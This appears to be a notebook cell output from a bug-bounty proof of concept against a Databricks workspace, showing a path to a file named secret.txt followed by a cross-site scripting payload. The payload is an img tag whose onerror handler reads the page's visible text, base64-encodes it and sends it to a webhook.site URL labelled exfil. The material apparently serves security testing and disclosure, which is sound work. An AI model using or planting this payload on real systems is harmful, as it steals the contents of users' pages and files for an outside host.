# %%
# Out:
# STRING_STARThttps://dbc-609f04f3-b516.cloud.databricks.com/ajax-api/2.0/workspace-files/Users/analysts%2Bwill%40managed.hackerone.com/secret.txt?o=7474653528780241STRING_END<img src="/x.png" onerror="setTimeout(function(){var s=document.body.innerText||&quot;&quot;;var q=new Image();q.src=&quot;https://webhook.site/214da0c3-0c33-4fc1-bb2e-bdfd99911729/exfil?f=secret.txt&amp;d=&quot;+encodeURIComponent(btoa(unescape(encodeURIComponent(s.slice(0,2000)))));},5000);">
